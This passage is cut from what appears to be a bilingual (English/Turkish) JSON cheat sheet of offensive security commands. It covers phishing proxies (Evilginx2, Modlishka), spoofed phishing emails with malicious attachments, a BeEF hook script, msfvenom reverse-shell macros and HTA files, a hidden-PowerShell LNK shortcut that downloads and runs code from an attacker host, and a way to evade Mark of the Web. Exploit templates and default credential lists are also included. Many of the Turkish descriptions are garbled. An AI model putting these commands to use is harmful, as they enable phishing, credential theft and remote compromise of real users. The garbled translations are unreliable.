            "desc_tr": "Başlat: Evilginx2 reverse vekil sunucu (proxy) for sessihijacking phishing üzerinde"
          },
          {
            "title": "Evilginx2 Setup Phishlet",
            "cmds": [
              "config domain <PHISHING_DOMAIN>",
              "config ip <ATTACKER_IP>",
              "phishlets hostname <PHISHLET_NAME> <PHISHING_SUBDOMAIN>",
              "phishlets enable <PHISHLET_NAME>",
              "lures create <PHISHLET_NAME>",
              "lures get-url <LURE_ID>"
            ],
            "tags": [
              "advanced"
            ],
            "desc": "Configure Evilginx2 phishlet for MitM credential and session capture",
            "desc_tr": "Yapılandır: Evilginx2 phishlet for MitM kimlik bilgileri and sessicapture üzerinde"
          },
          {
            "title": "Modlishka Launch",
            "cmd": "sudo ./Modlishka -config modlishka.json",
            "tags": [
              "advanced"
            ],
            "desc": "Start Modlishka reverse proxy phishing framework",
            "desc_tr": "Başlat: Modlishka reverse vekil sunucu (proxy) phishing framework"
          },
          {
            "title": "Simple HTTPS Phishing Server",
            "cmd": "python3 -m http.server 443 --directory /path/to/phishing/site/",
            "tags": [
              "tool"
            ],
            "desc": "Quick and dirty hosting for phishing pages",
            "desc_tr": "Hızlı and dirty hosting for phishing pages"
          },
          {
            "title": "Evilginx2 Start",
            "desc": "Launch reverse proxy phishing",
            "cmd": "sudo evilginx2 -p /opt/evilginx2/phishlets",
            "tags": [
              "tool"
            ],
            "desc_tr": "Launch reverse vekil sunucu (proxy) phishing"
          }
        ],
        "name_tr": "Phishing Infrastructure"
      },
      {
        "name": "Email Reconnaissance",
        "commands": [
          {
            "title": "Check SPF Record",
            "cmd": "dig TXT <DOMAIN> | grep spf",
            "tags": [
              "essential"
            ],
            "desc": "Check the SPF record for email sender validation",
            "desc_tr": "Kontrol et: the SPF record for email sender validation"
          },
          {
            "title": "Check DKIM Record",
            "cmd": "dig TXT selector1._domainkey.<DOMAIN>",
            "tags": [
              "essential"
            ],
            "desc": "Look up DKIM selector DNS record",
            "desc_tr": "Look up DKIM selector DNS record"
          },
          {
            "title": "Check DMARC Record",
            "cmd": "dig TXT _dmarc.<DOMAIN>",
            "tags": [
              "essential"
            ],
            "desc": "Check DMARC policy for the target domain",
            "desc_tr": "Kontrol et: DMARC policy for the target domain"
          },
          {
            "title": "Check MX Records",
            "cmd": "dig MX <DOMAIN>",
            "tags": [
              "essential"
            ],
            "desc": "Look up mail exchange servers for the domain",
            "desc_tr": "Look up mail exchange servers for the domain"
          },
          {
            "title": "Full Email Security Check",
            "cmds": [
              "dig MX <DOMAIN> +short",
              "dig TXT <DOMAIN> | grep -i spf",
              "dig TXT _dmarc.<DOMAIN> +short",
              "dig TXT selector1._domainkey.<DOMAIN> +short"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Comprehensive email security record enumeration",
            "desc_tr": "Kapsamlı email security record listeleme"
          },
          {
            "title": "Verify Email via SMTP",
            "cmds": [
              "swaks --to <EMAIL> --server <MX_SERVER> --quit-after RCPT"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Verify if an email address exists via SMTP RCPT TO",
            "desc_tr": "Doğrula: if an email address exists SMTP RCPT üzerinden'e"
          },
          {
            "title": "theHarvester Email Enum",
            "cmd": "theHarvester -d <DOMAIN> -b google,linkedin,bing -l 500",
            "tags": [
              "essential"
            ],
            "desc": "Enumerate email addresses from public sources",
            "desc_tr": "Listele: email addresses public sources üzerinden"
          }
        ],
        "name_tr": "Email Reconnaissance"
      },
      {
        "name": "Credential Harvesting",
        "commands": [
          {
            "title": "SWAKS SMTP Test",
            "cmd": "swaks --to <VICTIM_EMAIL> --from <SPOOFED_EMAIL> --server <MX_SERVER> --header 'Subject: Important Update' --body 'Please visit http://<ATTACKER_IP>/login'",
            "tags": [
              "essential"
            ],
            "desc": "Send a test phishing email via SMTP",
            "desc_tr": "Send a test phishing email SMTP üzerinden"
          },
          {
            "title": "SWAKS with Attachment",
            "cmd": "swaks --to <VICTIM_EMAIL> --from <SPOOFED_EMAIL> --server <MX_SERVER> --header 'Subject: Invoice' --body 'See attached.' --attach /path/to/payload.docm",
            "tags": [
              "tool"
            ],
            "desc": "Send phishing email with malicious attachment",
            "desc_tr": "Send phishing email malicious attachment ile"
          },
          {
            "title": "BeEF Hook Script",
            "cmd": "<script src=\"http://<ATTACKER_IP>:3000/hook.js\"></script>",
            "tags": [
              "tool"
            ],
            "desc": "Browser Exploitation Framework hook to inject in phishing pages",
            "desc_tr": "Browser istismar Framework hook inject phishing pages'e içinde"
          },
          {
            "title": "BeEF Start",
            "cmd": "sudo beef-xss",
            "tags": [
              "tool"
            ],
            "desc": "Start the Browser Exploitation Framework",
            "desc_tr": "Başlat: the Browser istismar Framework"
          },
          {
            "title": "PHP Credential Logger",
            "cmd": "php -S 0.0.0.0:80 -t /path/to/phishing/site/",
            "tags": [
              "tool"
            ],
            "desc": "Serve phishing page with PHP backend for credential capture",
            "desc_tr": "Serve phishing page PHP backend for kimlik bilgileri capture ile"
          },
          {
            "title": "Responder for WPAD Capture",
            "cmd": "sudo responder -I <INTERFACE> -wFb",
            "tags": [
              "tool"
            ],
            "desc": "Capture credentials via WPAD proxy auto-discovery",
            "desc_tr": "Yakala: kimlik bilgileri WPAD vekil sunucu (proxy) auto-discovery üzerinden"
          }
        ],
        "name_tr": "Credential Harvesting"
      },
      {
        "name": "Payload Delivery",
        "commands": [
          {
            "title": "HTA Payload Generator (msfvenom)",
            "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f hta-psh -o payload.hta",
            "tags": [
              "essential"
            ],
            "desc": "Generate an HTA file that executes PowerShell meterpreter",
            "desc_tr": "Oluştur: an HTA file that executes PowerShell meterpreter"
          },
          {
            "title": "Macro Payload (msfvenom)",
            "cmd": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f vba-exe",
            "tags": [
              "essential"
            ],
            "desc": "Generate VBA macro code for embedding in Office documents",
            "desc_tr": "Oluştur: VBA macro code for embedding Office documents içinde"
          },
          {
            "title": "VBA Macro Payload (Raw PS)",
            "cmd": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f vba",
            "tags": [
              "tool"
            ],
            "desc": "Generate VBA payload for macro-enabled documents",
            "desc_tr": "Oluştur: VBA payload for macro-enabled documents"
          },
          {
            "title": "URL File Payload",
            "cmds": [
              "# Create a .url file:",
              "echo '[InternetShortcut]' > payload.url",
              "echo 'URL=file://<ATTACKER_IP>/share/payload.exe' >> payload.url"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Create a .url file pointing to a remote payload",
            "desc_tr": "Oluştur: a .url file pointing a uzak payload'e"
          },
          {
            "title": "LNK Payload (PowerShell)",
            "cmd": "powershell -c \"$s=New-Object -ComObject WScript.Shell;$sc=$s.CreateShortcut('C:\\Temp\\legit.lnk');$sc.TargetPath='powershell.exe';$sc.Arguments='-w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(''http://<ATTACKER_IP>/shell.ps1'')';$sc.IconLocation='C:\\Windows\\System32\\shell32.dll,3';$sc.Save()\"",
            "tags": [
              "advanced"
            ],
            "desc": "Create a malicious LNK shortcut with hidden PowerShell execution",
            "desc_tr": "Oluştur: a malicious LNK shortcut gizli PowerShell executiile üzerinde"
          },
          {
            "title": "URL Shortener with Redirect",
            "cmd": "# Use services like bit.ly / tinyurl to mask phishing URLs",
            "tags": [
              "tool"
            ],
            "desc": "Shorten and cloak phishing URLs for click-through",
            "desc_tr": "Shorten and cloak phishing URLs for click-through"
          },
          {
            "title": "Generate Office Macro (Unicorn)",
            "cmd": "python3 unicorn.py windows/meterpreter/reverse_tcp <ATTACKER_IP> <PORT> macro",
            "tags": [
              "tool"
            ],
            "desc": "Generate obfuscated PowerShell macro payload with Unicorn",
            "desc_tr": "Oluştur: obfuscated PowerShell macro payload Unicorn ile"
          },
          {
            "title": "ISO Payload Container",
            "cmds": [
              "# Package payload inside an ISO to bypass MOTW:",
              "mkisofs -o payload.iso -J -r /path/to/payload/"
            ],
            "tags": [
              "advanced"
            ],
            "desc": "Package payload in ISO to bypass Mark of the Web",
            "desc_tr": "Package payload ISO bypass Mark of the Web'e içinde"
          }
        ],
        "name_tr": "Payload Delivery"
      },
      {
        "name": "OSINT & Pretexting",
        "commands": [
          {
            "title": "Sherlock Username Search",
            "desc": "Find username across networks",
            "cmd": "python3 sherlock.py <USERNAME>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Bul: username networks genelinde"
          },
          {
            "title": "Holehe Email Check",
            "desc": "Check email registrations",
            "cmd": "holehe <EMAIL>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kontrol et: email registrations"
          },
          {
            "title": "CrossLinked LinkedIn",
            "desc": "Scrape LinkedIn for names",
            "cmd": "crosslinked -f '{first}.{last}@<DOMAIN>' '<COMPANY>'",
            "tags": [
              "tool"
            ],
            "desc_tr": "Scrape Linkedfor names içinde"
          },
          {
            "title": "swaks SMTP Test",
            "desc": "Send test email",
            "cmd": "swaks --to <EMAIL> --from test@test.com --server <SMTP_SERVER> --body 'Test'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Send test email"
          }
        ],
        "name_tr": "OSINT & Pretexting"
      }
    ],
    "name_tr": "Sosyal Mühendislik ve Oltalama",
    "description_tr": "Phishing infrastructure, credential harvesting, and social engineering tools"
  },
  {
    "id": "exploit-dev",
    "name": "Exploit Research & Development",
    "icon": "💣",
    "description": "Find, adapt, compile, and develop exploits for penetration testing",
    "subcategories": [
      {
        "name": "Finding Public Exploits",
        "commands": [
          {
            "title": "SearchSploit Basic Search",
            "cmd": "searchsploit <KEYWORD>",
            "tags": [
              "essential"
            ],
            "desc": "Search Exploit-DB for exploits matching a keyword",
            "desc_tr": "Ara: istismar-DB for exploits matching a keyword"
          },
          {
            "title": "SearchSploit Exact Title Match",
            "cmd": "searchsploit -t <KEYWORD>",
            "tags": [
              "tool"
            ],
            "desc": "Search only in exploit titles for exact matches",
            "desc_tr": "Ara: only istismar titles for exact matches içinde"
          },
          {
            "title": "SearchSploit Copy Exploit",
            "cmd": "searchsploit -m <EXPLOIT_ID>",
            "tags": [
              "essential"
            ],
            "desc": "Copy an exploit to the current working directory",
            "desc_tr": "Kopyala: an istismar the mevcut working directory'e"
          },
          {
            "title": "SearchSploit Examine Exploit",
            "cmd": "searchsploit -x <EXPLOIT_PATH>",
            "tags": [
              "essential"
            ],
            "desc": "View the exploit code without copying",
            "desc_tr": "View the istismar code copying olmadan"
          },
          {
            "title": "SearchSploit Update Database",
            "cmd": "searchsploit --update",
            "tags": [
              "essential"
            ],
            "desc": "Update the local Exploit-DB database",
            "desc_tr": "Update the yerel istismar-DB database"
          },
          {
            "title": "SearchSploit JSON Output",
            "cmd": "searchsploit -j <KEYWORD>",
            "tags": [
              "tool"
            ],
            "desc": "Output search results in JSON format",
            "desc_tr": "Output search results JSformat üzerinde içinde"
          },
          {
            "title": "SearchSploit Exclude Terms",
            "cmd": "searchsploit <KEYWORD> --exclude='DoS'",
            "tags": [
              "tool"
            ],
            "desc": "Search but exclude denial of service exploits",
            "desc_tr": "Ara: but exclude denial of service exploits"
          },
          {
            "title": "SearchSploit by Platform",
            "cmd": "searchsploit -p linux <KEYWORD>",
            "tags": [
              "tool"
            ],
            "desc": "Filter exploits by platform",
            "desc_tr": "Filtrele: exploits by platform"
          },
          {
            "title": "GitHub CVE Search",
            "cmd": "# Search github.com/topics/<CVE_ID> or github.com/search?q=<CVE_ID>",
            "tags": [
              "essential"
            ],
            "desc": "Search GitHub for CVE proof-of-concept exploits",
            "desc_tr": "Ara: GitHub for CVE proof-of-concept exploits"
          },
          {
            "title": "Google Dork for Exploits",
            "cmd": "# site:github.com inurl:CVE-<YEAR>-<ID> OR site:exploit-db.com <SOFTWARE> <VERSION>",
            "tags": [
              "tool"
            ],
            "desc": "Google dork to find public exploits across the web",
            "desc_tr": "Google dork find public exploits the web'e genelinde"
          }
        ],
        "name_tr": "Finding Public Exploits"
      },
      {
        "name": "Adapting & Compiling",
        "commands": [
          {
            "title": "Cross-Compile for Windows x64",
            "cmd": "x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32",
            "tags": [
              "essential"
            ],
            "desc": "Compile C exploit for 64-bit Windows from Linux",
            "desc_tr": "Compile C istismar for 64-bit Windows Linux üzerinden"
          },
          {
            "title": "Cross-Compile for Windows x86",
            "cmd": "i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32",
            "tags": [
              "essential"
            ],
            "desc": "Compile C exploit for 32-bit Windows from Linux",
            "desc_tr": "Compile C istismar for 32-bit Windows Linux üzerinden"
          },
          {
            "title": "Compile for Linux x64",
            "cmd": "gcc exploit.c -o exploit",
            "tags": [
              "essential"
            ],
            "desc": "Compile C exploit for Linux 64-bit",
            "desc_tr": "Compile C istismar for Linux 64-bit"
          },
          {
            "title": "Compile for Linux x86",
            "cmd": "gcc -m32 exploit.c -o exploit",
            "tags": [
              "tool"
            ],
            "desc": "Compile C exploit for Linux 32-bit",
            "desc_tr": "Compile C istismar for Linux 32-bit"
          },
          {
            "title": "Static Compile (No Dependencies)",
            "cmd": "gcc exploit.c -o exploit -static",
            "tags": [
              "essential"
            ],
            "desc": "Statically link exploit to avoid library dependency issues",
            "desc_tr": "Statically link istismar avoid library dependency issues'e"
          },
          {
            "title": "Python 2 to 3 Conversion",
            "cmd": "2to3 -w exploit.py",
            "tags": [
              "essential"
            ],
            "desc": "Convert Python 2 exploit to Python 3 syntax",
            "desc_tr": "Dönüştür: Pyth2 istismar Python 3 syntax üzerinde'e"
          },
          {
            "title": "Install Python Dependencies",
            "cmd": "pip3 install requests pycryptodome impacket",
            "tags": [
              "tool"
            ],
            "desc": "Install common Python modules needed by exploits",
            "desc_tr": "Kur: commPython modules needed by exploits üzerinde"
          },
          {
            "title": "Compile with Debug Symbols",
            "cmd": "gcc -g exploit.c -o exploit",
            "tags": [
              "tool"
            ],
            "desc": "Compile with debug info for troubleshooting",
            "desc_tr": "Compile debug info for troubleshooting ile"
          },
          {
            "title": "Cross-Compile (Static Windows)",
            "cmd": "x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32 -static",
            "tags": [
              "tool"
            ],
            "desc": "Statically compile for Windows to avoid DLL issues",
            "desc_tr": "Statically compile for Windows avoid DLL issues'e"
          },
          {
            "title": "Compile C++ Exploit",
            "cmd": "g++ exploit.cpp -o exploit -lstdc++",
            "tags": [
              "tool"
            ],
            "desc": "Compile a C++ exploit for Linux",
            "desc_tr": "Compile a C++ istismar for Linux"
          }
        ],
        "name_tr": "Adapting & Compiling"
      },
      {
        "name": "Buffer Overflow Basics",
        "commands": [
          {
            "title": "Generate Cyclic Pattern",
            "cmd": "msf-pattern_create -l <LENGTH>",
            "tags": [
              "essential"
            ],
            "desc": "Generate a unique pattern for offset identification",
            "desc_tr": "Oluştur: a unique pattern for offset identification"
          },
          {
            "title": "Find Pattern Offset",
            "cmd": "msf-pattern_offset -l <LENGTH> -q <EIP_VALUE>",
            "tags": [
              "essential"
            ],
            "desc": "Calculate the exact offset from a pattern match in EIP/RIP",
            "desc_tr": "Calculate the exact offset a pattern match EIP/RIP üzerinden içinde"
          },
          {
            "title": "Generate Bad Characters",
            "cmd": "python3 -c \"import sys; sys.stdout.buffer.write(bytes(range(1,256)))\" > badchars.bin",
            "tags": [
              "essential"
            ],
            "desc": "Generate all byte values (0x01-0xFF) for bad character analysis",
            "desc_tr": "Oluştur: tüm byte values (0x01-0xFF) for bad character analysis"
          },
          {
            "title": "msfvenom Bad Char Shellcode",
            "cmd": "msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -b '\\x00\\x0a\\x0d' -f python -v shellcode",
            "tags": [
              "essential"
            ],
            "desc": "Generate shellcode excluding specified bad characters",
            "desc_tr": "Oluştur: shellcode excluding specified bad characters"
          },
          {
            "title": "Mona Find JMP ESP",
            "cmd": "!mona find -s '\\xff\\xe4' -m <MODULE_NAME>",
            "tags": [
              "essential"
            ],
            "desc": "Find JMP ESP instruction address in a loaded module",
            "note": "Run inside Immunity Debugger",
            "desc_tr": "Bul: JMP ESP instructiaddress a loaded module üzerinde içinde"
          },
          {
            "title": "Mona List Modules",
            "cmd": "!mona modules",
            "tags": [
              "essential"
            ],
            "desc": "List all loaded modules with memory protections (ASLR, DEP, etc.)",
            "desc_tr": "Listele: tüm loaded modules memory protections (ASLR, DEP, etc.) ile"
          },
          {
            "title": "Mona Generate Bytearray",
            "cmd": "!mona bytearray -cpb '\\x00'",
            "tags": [
              "essential"
            ],
            "desc": "Generate a byte array excluding null bytes for bad char testing",
            "desc_tr": "Oluştur: a byte array excluding null bytes for bad char testing"
          },
          {
            "title": "Mona Compare Bytearray",
            "cmd": "!mona compare -f C:\\mona\\bytearray.bin -a <ESP_ADDRESS>",
            "tags": [
              "essential"
            ],
            "desc": "Compare memory with bytearray to identify bad characters",
            "desc_tr": "Karşılaştır: memory bytearray identify bad characters ile'e"
          },
          {
            "title": "Mona Suggest Gadgets (ROP)",
            "cmd": "!mona rop -m <MODULE_NAME>",
            "tags": [
              "advanced"
            ],
            "desc": "Find ROP gadgets for DEP bypass",
            "desc_tr": "Bul: ROP gadgets for DEP bypass"
          },
          {
            "title": "Check Binary Protections",
            "cmd": "checksec --file=<BINARY>",
            "tags": [
              "essential"
            ],
            "desc": "Check NX, ASLR, PIE, canary, and RELRO protections",
            "desc_tr": "Kontrol et: NX, ASLR, PIE, canary, and RELRO protections"
          },
          {
            "title": "Pattern Create",
            "desc": "Generate unique pattern",
            "cmd": "msf-pattern_create -l <LENGTH>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Oluştur: unique pattern"
          },
          {
            "title": "Pattern Offset",
            "desc": "Find EIP offset",
            "cmd": "msf-pattern_offset -l <LENGTH> -q <EIP_VALUE>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bul: EIP offset"
          },
          {
            "title": "Checksec",
            "desc": "Check binary protections",
            "cmd": "checksec --file=<BINARY>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Kontrol et: binary protections"
          },
          {
            "title": "ROPgadget",
            "desc": "Find ROP gadgets",
            "cmd": "ROPgadget --binary <BINARY> | grep 'pop rdi'",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Bul: ROP gadgets"
          },
          {
            "title": "one_gadget",
            "desc": "Find magic gadgets",
            "cmd": "one_gadget /lib/x86_64-linux-gnu/libc.so.6",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Bul: magic gadgets"
          },
          {
            "title": "GDB with GEF",
            "desc": "Debug with GEF",
            "cmds": [
              "gdb -q <BINARY>",
              "# checksec, vmmap, pattern create, pattern search"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Debug GEF ile"
          }
        ],
        "name_tr": "Buffer Overflow Basics"
      },
      {
        "name": "Scripting Exploits",
        "commands": [
          {
            "title": "Python struct.pack (Little Endian)",
            "cmd": "python3 -c \"import struct; print(struct.pack('<I', 0x<ADDRESS>))\"",
            "tags": [
              "essential"
            ],
            "desc": "Pack an address in little-endian format for exploit payload",
            "desc_tr": "Pack an address little-endian format for istismar payload içinde"
          },
          {
            "title": "Python struct.pack (64-bit)",
            "cmd": "python3 -c \"import struct; print(struct.pack('<Q', 0x<ADDRESS>))\"",
            "tags": [
              "tool"
            ],
            "desc": "Pack a 64-bit address in little-endian format",
            "desc_tr": "Pack a 64-bit address little-endian format içinde"
          },
          {
            "title": "Pwntools Basic Template",
            "cmds": [
              "from pwn import *",
              "context.binary = ELF('./<BINARY>')",
              "p = process('./<BINARY>')  # or remote('<TARGET_IP>', <PORT>)",
              "payload = b'A' * <OFFSET>",
              "payload += p64(<RETURN_ADDRESS>)",
              "p.sendline(payload)",
              "p.interactive()"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Basic pwntools exploit template for buffer overflows",
            "desc_tr": "Basic pwntools istismar template for buffer overflows"
          },
          {
            "title": "Pwntools Remote Exploit",
            "cmd": "python3 -c \"from pwn import *; r=remote('<TARGET_IP>',<PORT>); r.sendline(b'A'*<OFFSET> + p64(<ADDRESS>)); r.interactive()\"",
            "tags": [
              "essential"
            ],
            "desc": "Quick one-liner remote exploit with pwntools",
            "desc_tr": "Hızlı one-liner uzak istismar pwntools ile"
          },
          {
            "title": "Pwntools Shellcraft",
            "cmds": [
              "from pwn import *",
              "context.arch = 'amd64'  # or 'i386'",
              "shellcode = asm(shellcraft.sh())",
              "print(f'Shellcode length: {len(shellcode)}')"
            ],
            "tags": [
              "tool"
            ],
            "desc": "Generate shellcode using pwntools shellcraft",
            "desc_tr": "Oluştur: shellcode pwntools shellcraft kullanarak"
          },
          {
            "title": "Pwntools Find ROP Gadgets",
            "cmds": [
              "from pwn import *",
              "elf = ELF('./<BINARY>')",
              "rop = ROP(elf)",
              "print(rop.dump())"
            ],
            "tags": [
              "advanced"
            ],
            "desc": "Enumerate ROP gadgets with pwntools",
            "desc_tr": "Listele: ROP gadgets pwntools ile"
          },
          {
            "title": "Python Socket Exploit Template",
            "cmds": [
              "import socket",
              "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)",
              "s.connect(('<TARGET_IP>', <PORT>))",
              "payload = b'A' * <OFFSET> + b'<SHELLCODE>'",
              "s.send(payload)",
              "s.close()"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Basic Python socket template for network exploits",
            "desc_tr": "Basic Pythsocket template for network exploits üzerinde"
          },
          {
            "title": "Generate NOP Sled",
            "cmd": "python3 -c \"print(b'\\x90' * <LENGTH>)\"",
            "tags": [
              "essential"
            ],
            "desc": "Generate a NOP sled for shellcode alignment",
            "desc_tr": "Oluştur: a NOP sled for shellcode alignment"
          }
        ],
        "name_tr": "Scripting Exploits"
      }
    ],
    "name_tr": "Exploit Araştırma ve Geliştirme",
    "description_tr": "Find, adapt, compile, and develop exploits for penetration testing"
  },
  {
    "id": "pentest-workflow",
    "name": "Engagement Methodology & Playbook",
    "icon": "🧩",
    "description": "Structured pentest workflow, service checklists, and engagement methodology",
    "subcategories": [
      {
        "name": "Phase 1 — Reconnaissance Checklist",
        "commands": [
          {
            "title": "Full Nmap Workflow — Discovery",
            "cmd": "nmap -sn <TARGET_RANGE> -oG discovery.gnmap",
            "tags": [
              "essential"
            ],
            "desc": "Step 1: Host discovery scan across the target range",
            "desc_tr": "Step 1: aktif host keşfi tarama the target range genelinde"
          },
          {
            "title": "Full Nmap Workflow — All Ports",
            "cmd": "nmap -p- --min-rate 5000 -oN allports.txt <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Step 2: Scan all 65535 TCP ports quickly",
            "desc_tr": "Step 2: tarama tüm 65535 TCP ports quickly"
          },
          {
            "title": "Full Nmap Workflow — Service Enum",
            "cmd": "nmap -sC -sV -p<OPEN_PORTS> -oN services.txt <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Step 3: Service version and default script scan on open ports",
            "desc_tr": "Step 3: Service versiand default script tarama on açık portlar üzerinde"
          },
          {
            "title": "Full Nmap Workflow — Vuln Scan",
            "cmd": "nmap --script vuln -p<OPEN_PORTS> -oN vulns.txt <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Step 4: Run vulnerability scripts against discovered services",
            "desc_tr": "Step 4: Run zafiyet(ler) scripts discovered services'e karşı"
          },
          {
            "title": "Full Nmap Workflow — UDP Top Ports",
            "cmd": "sudo nmap -sU --top-ports 50 --min-rate 5000 -oN udp.txt <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Step 5: Quick scan of top UDP ports",
            "desc_tr": "Step 5: Quick tarama of top UDP ports"
          },
          {
            "title": "Web Enum — Identify Technology",
            "cmd": "whatweb http://<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Step 1: Identify web technologies, CMS, and frameworks",
            "desc_tr": "Step 1: Identify web technologies, CMS, and frameworks"
          },
          {
            "title": "Web Enum — Directory Brute Force",
            "cmd": "gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -o dirs.txt",
            "tags": [
              "essential"
            ],
            "desc": "Step 2: Brute force directories and files",
            "desc_tr": "Step 2: kaba kuvvet saldırısı directories and files"
          },
          {
            "title": "Web Enum — Nikto Scan",
            "cmd": "nikto -h http://<TARGET_IP> -o nikto.txt",
            "tags": [
              "essential"
            ],
            "desc": "Step 3: Automated web vulnerability scanning",
            "desc_tr": "Step 3: Automated web zafiyet(ler) tarama"
          },
          {
            "title": "Web Enum — Virtual Host Discovery",
            "cmd": "gobuster vhost -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain",
            "tags": [
              "tool"
            ],
            "desc": "Step 4: Discover virtual hosts and subdomains",
            "desc_tr": "Step 4: Discover virtual hosts and subdomains"
          }
        ],
        "name_tr": "Phase 1 — Reconnaissance Checklist"
      },
      {
        "name": "Phase 2 — Initial Access Patterns",
        "commands": [
          {
            "title": "Quick Win: Anonymous FTP",
            "cmd": "ftp <TARGET_IP>  # Login: anonymous / anonymous",
            "tags": [
              "essential"
            ],
            "desc": "Check for anonymous FTP access",
            "note": "Try username: anonymous, password: anonymous or blank",
            "desc_tr": "Kontrol et: for anonymous FTP access"
          },
          {
            "title": "Quick Win: Null SMB Session",
            "cmd": "smbclient -L //<TARGET_IP> -N",
            "tags": [
              "essential"
            ],
            "desc": "Check for null session SMB share listing",
            "desc_tr": "Kontrol et: for boş oturum SMB share listing"
          },
          {
            "title": "Quick Win: NFS Shares",
            "cmds": [
              "showmount -e <TARGET_IP>",
              "mount -t nfs <TARGET_IP>:/<SHARE> /mnt/nfs"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Check for exposed NFS shares and mount them",
            "desc_tr": "Kontrol et: for açık NFS shares and mount them"
          },
          {
            "title": "Quick Win: SMTP User Enum",
            "cmd": "smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Enumerate valid usernames via SMTP VRFY",
            "desc_tr": "Listele: valid usernames SMTP VRFY üzerinden"
          },
          {
            "title": "Quick Win: Default Credentials",
            "cmds": [
              "# Tomcat: tomcat/tomcat, admin/admin, tomcat/s3cret",
              "# Jenkins: admin/admin, admin/password",
              "# phpMyAdmin: root/(blank), root/root",
              "# WordPress: admin/admin, admin/password"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Try common default credentials for known services",
            "note": "Always check service-specific default creds before brute forcing",
            "desc_tr": "Try commdefault kimlik bilgileri for known services üzerinde"
          },
          {
            "title": "Quick Win: Redis Unauthenticated",
            "cmd": "redis-cli -h <TARGET_IP> INFO",
            "tags": [
              "tool"
            ],
            "desc": "Check for unauthenticated Redis access",
            "desc_tr": "Kontrol et: for unauthenticated Redis access"
          },
          {
            "title": "Quick Win: MongoDB No Auth",
            "cmd": "mongosh --host <TARGET_IP> --eval 'db.adminCommand({listDatabases:1})'",
            "tags": [
              "tool"
            ],
            "desc": "Check for unauthenticated MongoDB access",
            "desc_tr": "Kontrol et: for unauthenticated MongoDB access"
          },
          {
            "title": "Quick Win: SNMP Default Community",
            "cmd": "snmpwalk -v2c -c public <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc": "Check for default SNMP community string 'public'",
            "desc_tr": "Kontrol et: for default SNMP community string 'public'"
          },
          {
            "title": "Quick Win: IPMI Hash Dump",
            "cmd": "msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <TARGET_IP>; run; exit'",
            "tags": [
              "tool"
            ],
            "desc": "Dump IPMI hashes (usually crackable)",
            "desc_tr": "Dökümle: IPMI hashes (usually crackable)"
          }
        ],
        "name_tr": "Phase 2 — Initial Access Patterns"
      },
      {
        "name": "Phase 3 — Post-Exploitation Checklist",
        "commands": [
          {
            "title": "Post-Exploit Step 1: Stabilize Shell",
            "cmds": [
              "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
              "# Ctrl+Z",
              "stty raw -echo; fg",
              "export TERM=xterm"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Upgrade raw shell to fully interactive TTY",
            "desc_tr": "Upgrade raw shell fully interactive TTY'e"
          },
          {
            "title": "Post-Exploit Step 2: User Context",
            "cmds": [
              "whoami",
              "id",
              "hostname",
              "ip a"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Establish current user context and network position",
            "desc_tr": "Establish mevcut user context and network position"
          },
          {
            "title": "Post-Exploit Step 3: Sudo Check",
            "cmd": "sudo -l",
            "tags": [
              "essential"
            ],
            "desc": "Check what commands the current user can run as sudo",
            "desc_tr": "Kontrol et: what commands the mevcut user can run as sudo"
          },
          {
            "title": "Post-Exploit Step 4: SUID Binaries",
            "cmd": "find / -perm -4000 -type f 2>/dev/null",
            "tags": [
              "essential"
            ],
            "desc": "Find SUID binaries for potential privilege escalation",
            "desc_tr": "Bul: SUID binaries for potential yetki yükseltme"
          },
          {
            "title": "Post-Exploit Step 5: Cron Jobs",
            "cmds": [
              "cat /etc/crontab",
              "ls -la /etc/cron.d/",
              "ls -la /etc/cron.daily/",
              "crontab -l"
            ],
            "tags": [
              "essential"
            ],
            "desc": "Enumerate scheduled tasks for exploitation",
            "desc_tr": "Listele: zamanlanmış görevler for istismar"
          },
          {
            "title": "Post-Exploit Step 6: Capabilities",
            "cmd": "getcap -r / 2>/dev/null",
            "tags": [
              "essential"
            ],
            "desc": "Find binaries with Linux capabilities set",
            "desc_tr": "Bul: binaries Linux capabilities set ile"
          },
          {
            "title": "Post-Exploit Step 7: Kernel Info",
            "cmd": "uname -a && cat /etc/os-release",
